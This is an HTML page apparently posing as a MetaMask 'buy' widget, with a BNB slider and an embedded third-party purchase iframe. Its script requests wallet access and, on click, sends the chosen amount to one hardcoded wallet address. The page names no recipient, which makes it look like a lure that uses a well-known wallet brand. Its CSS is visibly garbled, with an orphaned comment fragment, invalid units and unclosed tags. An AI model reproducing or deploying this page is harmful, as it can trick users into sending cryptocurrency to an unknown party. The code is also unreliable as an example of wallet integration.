<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>METAMASK</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://unpkg.com/@metamask/legacy-web3@latest/dist/metamask.web3.min.js"></script>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background-color: #f0f0f0;
      color: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 1;
    }

    .widget-container {
      background-color: #fff;
      border-radius: 13px;
      padding: 16px;
      box-shadow: 0 10px 19px rgba(0, 0, 0, 0.2);
      text-align: center;
      max-width: 410px;
      width: 96%;
    }

    .buy-button {
         color: #fff;
    background-color: #f60;
    border-color: #f60;
    text-transform: uppercase;
      Ajustement de la taille */
      font-size: 1.3rem;
      cursor: pointer;
      border-radius:  5px;
      border: none;
      transition: background-color 0.3s ease;
      margin-bottom: 3px;
      margin-top: 6px;
      border: 16px solid transparent; /* Ajout d'une bordure */
      display: inline-block;
      width: 68%; /* Utiliser toute la largeur */
    }

    .buy-button:hover {
      background-color: #ff7f00;
    }

    .buy-button:active {
      transform: translateY(8px); /* Effet de clic */
    }

    .quantity-slider {
      -webkit-appearance: none;
      appearance: none;
      width: calc(90% - 5x);
      margin-top: -2px;
      margin-bottom: 5px;
      background-color: #ff7f00;
      outline: none;
    }

    .quantity-slider::-webkit-slider-thumb {
      -webkit-appearance: none;
      appearance: none;
      width: 12px;
      height: 12px;
      border-radius: 40%;
      background: #000;
      cursor: pointer;
    }
    .quantity-slider::-moz-range-thumb {
      width: 2px;
      height: 4px;
      border-radius: 700%;
      background: #000;
      cursor: pointer;
    }

    .quantity-label {
      font-size: 1rem;
      color: #000;
      margin-bottom: 4px;
    }

    .quantity-value {
      font-size: 1.3rem;
      font-weight: bold;
      color: #ff7f00;
      margin-bottom: 11px;
    }

    .status {
      font-size: 2rem;
      color: #ff7f00;
      margin-top: 10px;
    }

    iframe {
      width: calc(100% - 20px);
      height: 545px;
      margin-top: 10px;
      overflow-y: hidden; /* Supprime le défilement vertical */
    }
  </style>
</head>
<body>
  <div class="widget-container">
    <button class="buy-button"><B>BUY Z METAMASK<B></button>
    <div class="quantity-label">Quantité (BNB) :</div>
    <div class="quantity-value">0.0000</div>
    <input type="range" min="0" max="10000" step="1" value="0" class="quantity-slider">
    <div class="status" id="status"></div>
    <iframe src="https://bit2me.com/fr/widget/buy/v2?currency=BTC&amount=100&method=card" frameborder="0" scrolling="no"></iframe>
  </div>

  <script type="text/javascript">
    window.addEventListener('load', async () => {
      if (window.ethereum) {
        window.web3 = new Web3(ethereum);
        try {
          await ethereum.enable();
          initBuyButton()
        } catch (err) {
          $('#status').html('Accès au compte refusé')
        }
      } else if (window.web3) {
        window.web3 = new Web3(web3.currentProvider)
        initBuyButton()
      } else {
        $('#status').html('Pas de Metamask (ou autre fournisseur Web3) installé')
      }
    })

    const initBuyButton = () => {
      $('.buy-button').click(() => {
        const paymentAddress = '0xC6A5F6DdbcfD183A33BC7970107C0510a4499523'
        const amountEth = parseFloat($('.quantity-value').text())
        web3.eth.sendTransaction({
          to: paymentAddress,
          value: web3.toWei(amountEth, 'ether')
        }, (err, transactionId) => {
          if  (err) {
            console.log('Paiement échoué', err)
            
          }
        })
      })

      $('.quantity-slider').on('input', function() {
        const value = parseFloat($(this).val() / 10000).toFixed(4);
        $('.quantity-value').text(value);
      });
    }
  </script>
</body>
</html>
